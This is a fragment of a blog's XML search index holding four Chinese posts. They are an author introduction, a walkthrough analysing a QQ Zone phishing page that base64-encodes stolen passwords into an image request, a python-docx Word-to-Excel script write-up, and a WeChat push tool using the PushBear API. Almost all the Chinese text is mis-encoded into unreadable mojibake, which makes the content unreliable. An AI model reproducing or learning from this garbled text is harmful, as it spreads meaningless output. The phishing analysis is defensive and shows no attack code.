title="When?"></a>When?</h2><p>å…¶å®ä¹‹å‰æœ‰å•¥å°æƒ³æ³•æˆ–è€…å°åˆ¶ä½œï¼Œéƒ½æ˜¯éšä¾¿å†™ä¸¤å¥è¯è®²è®²åˆ°ç©ºé—´â€¦â€¦<br>å½“ç„¶ï¼Œ<strong>æœ‰æƒ³æ³•</strong> &amp;&amp; <strong>æœ‰ç©º</strong> çš„æ—¶å€™ï¼Œå°±æ¥è¿™å„¿å†™ç‚¹ä¸œè¥¿å§ï¼</p><hr><h2 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h2><p>å…¶å®æˆ‘æ„Ÿå…´è¶£çš„ä¸œè¥¿æŒºå¤šçš„ emmm<br>æ¯”å¦‚è¯´å¤§ä½“è¯´ä¸€è¯´å˜›ï¼š</p><ul><li><h4 id="åµŒå…¥å¼ç›¸å…³"><a href="#åµŒå…¥å¼ç›¸å…³" class="headerlink" title="åµŒå…¥å¼ç›¸å…³"></a>åµŒå…¥å¼ç›¸å…³</h4><ul><li>MCUå•ç‰‡æœº</li><li>FPGA</li><li>ç‰©è”ç½‘ IoT<ul><li>ESP8266<br>ï¼ˆå‡†å¤‡å¥½å¥½ç ”ç©¶ä¸€æ³¢ï¼Œå¯ä»¥å•ç‹¬åˆ—ä¸€åˆ—ï¼‰</li></ul></li></ul></li><li><h4 id="ç¼–ç¨‹"><a href="#ç¼–ç¨‹" class="headerlink" title="ç¼–ç¨‹"></a>ç¼–ç¨‹</h4><ul><li>Python ä»¥åŠå„ç§åº“</li><li>MATLAB  </li></ul></li><li><h4 id="äººå·¥æ™ºèƒ½-AI"><a href="#äººå·¥æ™ºèƒ½-AI" class="headerlink" title="äººå·¥æ™ºèƒ½ AI"></a>äººå·¥æ™ºèƒ½ AI</h4><ul><li>æœºå™¨å­¦ä¹  Machine Learningï¼ŒML </li></ul></li><li><h4 id="è®¡ç®—æœºè§†è§‰-Computer-Visionï¼ŒCV"><a href="#è®¡ç®—æœºè§†è§‰-Computer-Visionï¼ŒCV" class="headerlink" title="è®¡ç®—æœºè§†è§‰ Computer Visionï¼ŒCV"></a>è®¡ç®—æœºè§†è§‰ Computer Visionï¼ŒCV</h4></li><li><h4 id="æ•°æ®åˆ†æä¸æŒ–æ˜"><a href="#æ•°æ®åˆ†æä¸æŒ–æ˜" class="headerlink" title="æ•°æ®åˆ†æä¸æŒ–æ˜"></a>æ•°æ®åˆ†æä¸æŒ–æ˜</h4><ul><li>æ•°æ®è·å–ï¼ˆå¦‚çˆ¬è™«è™«ï¼‰</li><li>æ•°æ®å¯è§†åŒ–</li></ul></li><li><p>æ•°æ®æŒ–æ˜</p></li><li><h4 id="å¾®ä¿¡å°ç¨‹åºå¼€å‘"><a href="#å¾®ä¿¡å°ç¨‹åºå¼€å‘" class="headerlink" title="å¾®ä¿¡å°ç¨‹åºå¼€å‘"></a>å¾®ä¿¡å°ç¨‹åºå¼€å‘</h4></li><li><h4 id="å‰ç«¯å°ä¸ªé²œ"><a href="#å‰ç«¯å°ä¸ªé²œ" class="headerlink" title="å‰ç«¯å°ä¸ªé²œ"></a>å‰ç«¯å°ä¸ªé²œ</h4></li><li><h4 id="è§†é¢‘åˆ¶ä½œ"><a href="#è§†é¢‘åˆ¶ä½œ" class="headerlink" title="è§†é¢‘åˆ¶ä½œ"></a>è§†é¢‘åˆ¶ä½œ</h4></li><li><p>etc.</p></li></ul><p>å…¶å®å°±æ˜¯å•¥éƒ½æƒ³ç©ä¸€ç©ï¼Œæ„Ÿè§‰èƒ½åšçš„å°±å»å°è¯•å°è¯•ï¼Œç‰¹åˆ«æ˜¯é‚£ç§æ¥è¿‘å®é™…çš„ã€‚<br>äºæ˜¯ä¹å°±<strong>æƒ³å†™å•¥å°±å†™å•¥</strong>å‘—ã€‚<br>ä¸è¿‡åŸºæœ¬ä¸Šä»¥å°æƒ³æ³•ä¸ºä¸»ï¼Œå°±æ˜¯éšä¾¿è®°å½•ä¸€ä¸‹è¿™æ ·å§ã€‚  </p><hr><p><strong>å¥½å•¦ç¬¬ä¸€ç¯‡å°±è¿™æ ·éšä¾¿å†™å†™äº†ã€‚<br>æºœå•¦æºœå•¦~</strong></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> Life </tag>
            
            <tag> å°æƒ³æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | æŸQQç©ºé—´ç›—å·é¡µé¢åˆ†æ</title>
      <link href="2019/03/30/Idea_AnalysisOfHackingPage/"/>
      <url>2019/03/30/Idea_AnalysisOfHackingPage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ¬è¿è‡ªä¹‹å‰çš„å°è„‘æ´å°æƒ³æ³•å•¦      </p></blockquote><h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>æ˜¨æ™šæœ‰ä¸ªå°ä¼™ä¼´ç©ºé—´é‡ŒæŠŠåˆ—è¡¨éƒ½atäº†ï¼ˆåæ¥çŸ¥é“çš„ï¼‰ï¼Œé™„å¸¦P1è¿™å¼ å›¾ã€‚  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/1.jpg" alt="1"></p><p>ç„¶åæ„Ÿè§‰ä¸å¯¹åŠ²ï¼Œè‚¯å®šæ˜¯è¢«ç›—å·äº†ã€‚  </p><p>ç„¶åçªç„¶æœ‰ä¸ªè„‘æ´ï¼Œå»çœ‹çœ‹è¿™é‡Œé¢æœ‰å•¥å§  </p><h2 id="æŠ˜è…¾è®°å½•"><a href="#æŠ˜è…¾è®°å½•" class="headerlink" title="æŠ˜è…¾è®°å½•"></a>æŠ˜è…¾è®°å½•</h2><p>ç”¨æ‰«ç å·¥å…·ï¼ˆåƒä¸‡åˆ«æ‹¿QQæ¥æ‰«ï¼Œè™½ç„¶è¿™æ¬¡çš„é“¾æ¥æ²¡å•¥å¤§å½±å“ï¼‰å¾—åˆ°äºŒç»´ç æ–‡å­—å†…å®¹ï¼Œå‘ç°æ˜¯ç±»ä¼¼<code>url.cn/...</code>çš„çŸ­é“¾æ¥ã€‚</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/2.jpg" alt="2"></p><p>ç”¨ç”µè„‘æµè§ˆå™¨æ‰“å¼€ï¼ŒåŒæ—¶æ‰“å¼€è°ƒè¯•çª—å£ï¼Œå‘ç°çŸ­é“¾æ¥è·³è½¬åˆ°ä¸€ä¸ªGithub.ioçš„é¡µé¢ï¼ˆP3ï¼‰ï¼Œå¾ˆæ˜æ˜¾æ˜¯GitHub Pagesã€‚   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/3.png" alt="3"></p><p>äºæ˜¯å»GitHubä¸ŠæŸ¥æ‰¾è¯¥ç”¨æˆ·ï¼Œå‘ç°åªæœ‰ä¸ªé¡¹ç›®ï¼Œé‡Œé¢å°±åªæœ‰ä¸€ä¸ªindex.htmlæ–‡ä»¶ï¼Œå¯¹åº”ç€P2é¡µé¢ï¼Œæœ€æ–°ç‰ˆæœ¬è¿˜æ˜¯æ˜¨å¤©æäº¤çš„ï¼ˆP4ï¼‰ã€‚   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/4.png" alt="4"></p><p>æ„Ÿè§‰ä¸å¯¹ï¼Œäºæ˜¯æ”¹å˜ User Agent ä¸ºæ‰‹æœºï¼Œé‡æ–°è®¿é—®çŸ­é“¾æ¥ï¼Œè·³è½¬P5é¡µé¢ï¼Œæ˜¯ä¸ªä¼ªQQç©ºé—´ç™»å½•ç•Œé¢ï¼Œæœç„¶æ˜¯ä¸ªé’“é±¼é¡µé¢233ã€‚ </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/5.png" alt="5"></p><p>ç‚¹å‡»ä¸€é”®ç™»å½•ï¼Œå»¶æ—¶ä¸€ä¼šå„¿ä¼šæç¤º è¯·å®‰è£…æœ€æ–°ç‰ˆæœ¬QQ ã€‚ã€å¿˜äº†å¯†ç ã€‘åŠã€æ³¨å†Œæ–°è´¦å·ã€‘éƒ½æ˜¯è·³è½¬åˆ°QQå®˜æ–¹çš„é¡µé¢ã€‚ç„¶åè¾“ä¸ª123456789å•¥çš„æµ‹è¯•ä¸€ä¸‹ï¼Œè¿˜ä¼šæç¤º è¯·è¾“å…¥æ­£ç¡®è´¦å·æˆ–è€…å¯†ç  å•¥çš„ï¼ˆP6ï¼‰ã€‚  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/6.png" alt="6"></p><p>ä¹±è¾“ä¸€ä¸ª987321654ï¼Œå™«è¿›å»äº†ï¼Œè·³è½¬åˆ°äº†çœŸçš„QQç©ºé—´ï¼Œè™½ç„¶å¹¶æ²¡æœ‰çœŸçš„ç™»å½•ï¼ˆP7ï¼‰ã€‚  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/7.png" alt="7"></p><p>è€Œååœ¨è°ƒè¯•çª—å£networkä¸‹æ‰¾äº†åŠå¤©ï¼Œéƒ½æ²¡å‘ç°æˆ‘æäº¤çš„è´¦å·å¯†ç ã€‚ï¼ˆP8-9ï¼‰</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/8.png" alt="8"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/9.png" alt="9"></p><p>é¡ºç€remote addressæŸ¥ï¼Œå‘ç°å”¯ä¸€æœ‰å¯èƒ½çš„å°±æ˜¯é‚£ä¸ªuser.jpgï¼Œè¿˜å¸¦tokenå‚æ•°ï¼Œéšè—å¾—æœ‰ç‚¹æ„æ€ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºå•¥404äº†ã€‚</p><hr><p>jioå¾—è¿˜æ²¡å®Œï¼Œè¿™tokenå’‹æ¥çš„ï¼Œæäº¤çš„<strong>è´¦å·å¯†ç å»å“ªäº†</strong>emmmï¼Œç¼ºç‚¹å•¥ã€‚ç„¶åæŸ¥çœ‹ç½‘é¡µå…ƒç´ ï¼Œæ‰¾åˆ°äº†å¯¹åº”çš„JavaScriptä»£ç ï¼ˆP10-11ï¼‰ã€‚</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/10.png" alt="10"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/11.png" alt="11"></p><p>å“ˆå“ˆå“ˆå“ˆå“ˆè¿™ä¸ªé€»è¾‘åˆ¤æ–­å†™çš„è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ï¼Œè¿˜æŠŠä¸€å †å¸¸ç”¨ç®€å•æ•°å­—ç»™å¤„ç†äº†ï¼Œéš¾æ€ªå‰é¢è¾“123456789ç©ä¸æ¥ã€‚è¿™ä¸ªä¸€é”®ç™»å½•å°±æ˜¯ä¸ªå‡çš„ï¼ˆä¸‡ä¸€çœŸçš„ä¼°è®¡å°±å¾—ä¸åˆ°è´¦å·å¯†ç äº†å§ï¼‰ã€‚ç‚¹å‡»ç™»å½•çš„æ—¶å€™ï¼Œå°†ç”¨æˆ·åå¯†ç æ‹¼æ¥æˆjsonå­—ç¬¦ä¸²ï¼Œç„¶åå°†å­—ç¬¦ä¸²è½¬æ¢æˆbase64åŠ å¯†ä¼ è¾“ï¼Œè€Œåè·³è½¬åˆ°å®˜æ–¹QQç©ºé—´ç•Œé¢ã€‚å°†P9çš„tokenç”¨base64è§£å¯†ï¼Œæœç„¶å¾—åˆ°äº†è´¦å·å¯†ç ï¼ˆP12ï¼‰ã€‚</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/12.png" alt="12">  </p><p><em>// ä»–æ²¡è°ƒç”¨å®˜æ–¹ç™»å½•æ¥å£ï¼Œæ²¡æœ‰çœŸçš„ç™»å½•åˆ°QQç©ºé—´å·²ç»å¾ˆå‹å¥½äº†ï¼Œä¸ç„¶æ›´éš¾å‘ç°å‘¢</em>  </p><hr><p>åˆ°è¿™å·®ä¸å¤šäº†ï¼Œä½†æ„Ÿè§‰è¿˜æ²¡å®Œï¼Œæˆ‘ä»¬å†æ¥<strong>æŸ¥æŸ¥è¿™ä¸ªåŸŸå</strong>å§ã€‚</p><p>P13-15æ³¨å†Œè€…ä¿¡æ¯ï¼Œè¿™äººæ³¨å†Œçš„åŸŸåçœŸå¤šã€‚</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/13.png" alt="13">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/14.png" alt="14">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/15.png" alt="15"></p><p>ç”¨é‚®ç®±æŸ¥è¯¢ï¼Œè€Œåéšä¾¿è®¿é—®å‡ ä¸ªï¼ŒP16å‘ç°éƒ½é‡å®šå‘åˆ°äº†ä¸€ä¸ªç›¸ä¼¼é¡µé¢ï¼ŒåŸæ¥é‚£æ˜¯è¥¿éƒ¨æ•°ç ä¸Šçš„ä¸€ä¸ªåŸŸåç»é”€å•†ã€‚è¿™ä¹ˆè¯´é‚£ä¸ªäººä¹Ÿåªæ˜¯ä»ç»é”€å•†é‚£é‡Œä¹°äº†ä¸ªåŸŸåè€Œå·²ã€‚</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/16.png" alt="16"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ˜¯ä¸ªåšå¾—æœ‰ç‚¹æ°´å¹³çš„é’“é±¼ç½‘ç«™ã€‚</p><p><strong>ç¢°åˆ°ç±»ä¼¼çš„äºŒç»´ç åˆ«ä¹±æ‰«ï¼Œæ‰«äº†ä¹Ÿåˆ«ç™»å½•ï¼</strong></p><p>è‡³äºè·å–è´¦å·å¯†ç ä¹‹åæŠŠå…¨åˆ—è¡¨éƒ½atï¼Œä¼°è®¡è¿˜å†™äº†åˆ«çš„è„šæœ¬æˆ–è€…è°ƒç”¨äº†å•¥æ¥å£ï¼Œè¿™ä¸ªæˆ‘è¿˜ä¸æ¸…æ¥šemmm   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/17.jpg" alt="åˆå¼€å§‹äº†"></p><p>ä»¥ä¸Šå†…å®¹å‡åŸºäºå…¬å¼€èµ„æ–™ï¼Œ<strong>ä»…ä¾›å­¦ä¹ ç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”</strong>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> QQç©ºé—´ </tag>
            
            <tag> ç›—å· </tag>
            
            <tag> åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | åˆ©ç”¨python-docxæ‰¹é‡æå–Wordä¸­çš„ä¿¡æ¯è¿›è€Œå¯¼å…¥Excel</title>
      <link href="2019/03/21/Idea_python-docx/"/>
      <url>2019/03/21/Idea_python-docx/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ¬è¿è‡ªä¹‹å‰çš„å°è„‘æ´å°æƒ³æ³•å•¦      </p></blockquote><p>åˆæ˜¯ä¸ªå°è„‘æ´<br>æœ€è¿‘æœ‰ä¸ªæ¯”èµ›è¦ç»Ÿè®¡ä¸€ä¸‹å„ç»„ä¿¡æ¯ï¼Œä¿¡æ¯æ¥è‡ªWordç‰ˆçš„ç”³è¯·è¡¨ã€‚</p><p><img src="/2019/03/21/Idea_python-docx/1.jpg" alt="1"></p><p>è€ƒè™‘åˆ°Wordè¦ä¸€ä¸ªä¸€ä¸ªæ‰“å¼€ï¼Œå†å¤åˆ¶ç²˜è´´ã€‚</p><p>ç®€å•é‡å¤ï¼Œå¤ªéš¾å—äº†8ï¼Œä¸å¦‚å¹²è„†pyä¸€ä¸‹ï¼Œå†™ä¸ªå°ç¨‹åºæ¥å¼„å§ã€‚  </p><h2 id="å¤§è‡´æ€è·¯"><a href="#å¤§è‡´æ€è·¯" class="headerlink" title="å¤§è‡´æ€è·¯"></a>å¤§è‡´æ€è·¯</h2><p>ä¸€æŸ¥å‘ç°.docxæ˜¯ä»¥ç±»ä¼¼xmlæ ¼å¼æ¥å­˜æ”¾ä¿¡æ¯çš„ï¼Œåˆšå¼€å§‹æ€è·¯å°±æƒ³ç›´æ¥è§£å‹.docxï¼Œä»ä¸­è§£ææ–‡ä»¶ç„¶åæš´åŠ›åŒ¹é…ã€‚ã€‚</p><p>è€Œåå‘ç°æœ‰ä¸ª**ç¬¬ä¸‰æ–¹åº“<code>python-docx</code>**ï¼Œäºæ˜¯ä¹ä¸æƒ³é€ è½®å­äº†ï¼Œç›´æ¥æ‹¿æ¥ç”¨å§ã€‚</p><p>ç„¶è€Œå¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œåˆå¹¶çš„å•å…ƒæ ¼å˜æˆç‹¬ç«‹é‡å¤çš„å†…å®¹ï¼ŒåŠ ä¸ªå»é‡å§ã€‚</p><h2 id="æå–ä¿¡æ¯"><a href="#æå–ä¿¡æ¯" class="headerlink" title="æå–ä¿¡æ¯"></a>æå–ä¿¡æ¯</h2><p>æ–‡å­—éƒ½è§£æå‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥ï¼Œæ¥ç‚¹ç®€å•çš„æ­£åˆ™åŒ¹é…ï¼Œå•ç‹¬æ‹¿ä¸ªæ–‡ä»¶æ¥è¯•è¯•ï¼Œæ²¡æ¯›ç—…ï¼ŒæŒºå¥½çš„ã€‚</p><h2 id="æ‰¹é‡è¯»å–"><a href="#æ‰¹é‡è¯»å–" class="headerlink" title="æ‰¹é‡è¯»å–"></a>æ‰¹é‡è¯»å–</h2><p>éå†æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œç­›é€‰<code>.docx</code>ä¸”æ’é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œå™«å°‘äº†ä¿©ã€‚</p><p>åŸæ¥è¿˜æœ‰.docæ ¼å¼çš„ï¼Œå¦å­˜ä¸º.docx *(docxåº“åªæ”¯æŒ.docx)*ã€‚</p><p>ä¾æ¬¡è¯»å–æ¯ä¸ªæ–‡ä»¶ï¼Œæ‹¼æ¥stringåˆ—è¡¨ï¼Œå¾—åˆ°æ‰€éœ€ä¿¡æ¯ã€‚</p><p><img src="/2019/03/21/Idea_python-docx/2.jpg" alt="2"></p><h2 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h2><p>å°†infolistæŒ‰ç…§<code>.csv</code>çš„æ ¼å¼å†™å…¥æ–‡ä»¶ã€‚</p><blockquote><p>å…¶å®å¯ä»¥è°ƒç”¨ç¬¬ä¸‰æ–¹åº“æ¥å®ç°çš„ã€‚</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>å®é™…æƒ…å†µè¿˜æ˜¯æŒºå¤æ‚çš„ï¼Œæ¯”å¦‚è¡¨æ ¼å“ªé‡Œæ²¡å¡«ç©ºç¼ºäº†ï¼Œæˆ–è€…å“ªä¸ªé‡Œé¢å¤šåŠ å‡ ä¸ªåˆ†éš”ç¬¦ä»€ä¹ˆçš„ï¼Œè¿˜æ˜¯å‡ºäº†ä¸å°‘bugï¼Œäºæ˜¯ç»§ç»­å®Œå–„ç¨‹åºï¼ŒåŠ å…¥ç›¸åº”çš„å¤„ç†å‘—ï¼  </p><p><strong>ç”Ÿäº§ç¯å¢ƒçœŸå¤æ‚</strong>  </p><p><img src="/2019/03/21/Idea_python-docx/3.jpg" alt="é‡åˆ°çš„æƒ…å†µ">  </p><p><img src="/2019/03/21/Idea_python-docx/4.jpg" alt="4">  </p><p>å¦‚æœç”¨Excelæ‰“å¼€<code>.csv</code>ï¼Œå‘ç°å­¦å·å‰çš„0è‡ªåŠ¨ä¸¢å¤±ï¼Œè¿˜æ˜¯è§‰å¾—ä¸çˆ½emmm ï¼ˆç¨‹åºçŒ¿çš„è‡ªæˆ‘ä¿®å…»  </p><p>åˆæŸ¥äº†æŸ¥èµ„æ–™ï¼Œæ–°å»º<code>.xlsx</code>ï¼Œä»æ–‡æœ¬å¯¼å…¥åˆ°Excelï¼Œè®¾ç½®å¥½å±æ€§ã€‚  </p><p>å‡ å¥½ï¼Œå®Œäº‹ï¼</p><p><img src="/2019/03/21/Idea_python-docx/5.jpg" alt="ä¿®æ­£åçš„åŒ¹é…ä»£ç ">  </p><p><img src="/2019/03/21/Idea_python-docx/6.jpg" alt="æœ€ç»ˆå¾—åˆ°çš„Excel">  </p><blockquote><p>äºæ˜¯ä¹è¾¹æŸ¥èµ„æ–™è¾¹debugè¾¹æ”¹ä»£ç  èŠ±äº†ä¸€ä¸ªå¤šä¸¤ä¸ªå°æ—¶<br>ä¼°è®¡å‡ ä¸ªäººåŒæ—¶æ‰‹åŠ¨åšæ—©éƒ½åšå®Œäº†  </p></blockquote><p>ï¼ˆå…¶å®æ—©å°±æƒ³è¿‡ç”¨pyè¯»å–Exceläº†ï¼Œä½†æ˜¯ä¸€ç›´è¿˜æ²¡è¯•è¿‡ï¼Œè¿™æ¬¡å°±å…ˆæ‹¿pyè¯»å–Wordè¯•è¯•æ°´å§</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> docx </tag>
            
            <tag> word </tag>
            
            <tag> csv </tag>
            
            <tag> æ‰¹é‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | åŸºäºPushBear APIå®ç°å¾®ä¿¡æ¶ˆæ¯æ¨é€</title>
      <link href="2019/03/07/Idea_PushBearAPI_WeChatPush/"/>
      <url>2019/03/07/Idea_PushBearAPI_WeChatPush/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ¬è¿è‡ªä¹‹å‰çš„å°æƒ³æ³•å•¦~  </p></blockquote><h2 id="è°ƒç”¨API"><a href="#è°ƒç”¨API" class="headerlink" title="è°ƒç”¨API"></a>è°ƒç”¨API</h2><p>åŸºäºPushBear APIå®ç°å¾®ä¿¡æ¶ˆæ¯æé†’  </p><p><a href="http://pushbear.ftqq.com/admin/#/">PushBear API</a></p><p>ç”¨requestsé‡Œç°æˆçš„æ–¹æ³•å°±å®Œäº‹äº†ã€‚  </p><h2 id="tkinter-GUI"><a href="#tkinter-GUI" class="headerlink" title="tkinter GUI"></a>tkinter GUI</h2><p>å°±æ˜¯ç›´æ¥å†™ä»£ç æ„Ÿè§‰æœ‰ç‚¹ä¸å‹å¥½</p><p>äºæ˜¯æƒ³åšä¸ªå›¾å½¢ç•Œé¢</p><p>åŸºäºPython GUIåº“tkinterç®€å•åšäº†ä¸€ä¸‹<br><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/1.jpg" alt="code">  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/GUI.png" alt="GUI"></p><blockquote><p>ï¼ˆä»£ç æ‰‹åŠ¨å†™å¸ƒå±€å¤ªéš¾å—äº†<br>ï¼ˆè¿˜æ˜¯ç›´æ¥ç”¨ä»£ç POST/GETæ–¹ä¾¿emmm<br><em>ï¼ˆçªç„¶jioå¾—LabVIEWåšå›¾å½¢ç•Œé¢çœŸæ–¹ä¾¿</em></p></blockquote><h2 id="å¾®ä¿¡æ¨é€æ•ˆæœ"><a href="#å¾®ä¿¡æ¨é€æ•ˆæœ" class="headerlink" title="å¾®ä¿¡æ¨é€æ•ˆæœ"></a>å¾®ä¿¡æ¨é€æ•ˆæœ</h2><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/push.jpg" alt="æ¨é€æ•ˆæœ"></p><p><strong>æ‰“å¼€åæ˜¯<code>Markdown</code>æ¸²æŸ“çš„æ•ˆæœå‘¢ï¼</strong>  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/2.jpg" alt="Markdown"></p><p>   ï¼ˆå®Œï¼‰  </p><blockquote><p><strong>20191221 Updateï¼š</strong>  </p><p>å¥½ä¹…æ²¡ç”¨äº†ä¸çŸ¥é“ç°åœ¨è¿˜èƒ½ä¸èƒ½ç”¨äº†233</p></blockquote><blockquote><p><strong>20200211 Update:</strong></p><blockquote><p>âš ï¸ ç›´å‘æœåŠ¡è½¬ä»£å‘çš„é€šçŸ¥ï¼ˆé‡è¦ï¼‰<br>å› å¤šæ¬¡è¢«æ¶æ„ä¸¾æŠ¥ï¼Œä»2019å¹´6æœˆå¼€å§‹ï¼Œåªæä¾›ã€Œå·²ç»å¾®ä¿¡è®¤è¯åçš„æœåŠ¡å·ã€è¿›è¡Œæˆæƒåï¼Œç”¨å…¶è‡ªæœ‰æ¥å£æƒé™ä»£å‘ã€‚<a href="http://sc.ftqq.com/6.version">ä»£å‘æˆæƒå’Œç»‘å®šæ•™ç¨‹</a></p></blockquote><p>æœ€è¿‘å¼„å¾®ä¿¡æ¶ˆæ¯æé†’åˆæ¥çœ‹äº†çœ‹ï¼Œå‘ç°ä¸€å¯¹å¤šçš„æ¨é€å¿…é¡»è¦<strong>ç»‘å®šå·²è®¤è¯çš„æœåŠ¡å·</strong>æ‰èƒ½ä½¿ç”¨äº†ã€‚</p><p>ä½†æ˜¯<strong>Serveré…±</strong>çš„ç»™è‡ªå·±ç»‘å®šçš„å¾®ä¿¡å·æ¨é€æ¶ˆæ¯è¿˜æ˜¯æœ‰æ•ˆçš„ã€‚</p><p>è¯¦è§ï¼š<a href="https://sc.ftqq.com/">https://sc.ftqq.com/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> API </tag>
            
            <tag> å¾®ä¿¡ </tag>
            
            <tag> æ¶ˆæ¯æ¨é€ </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
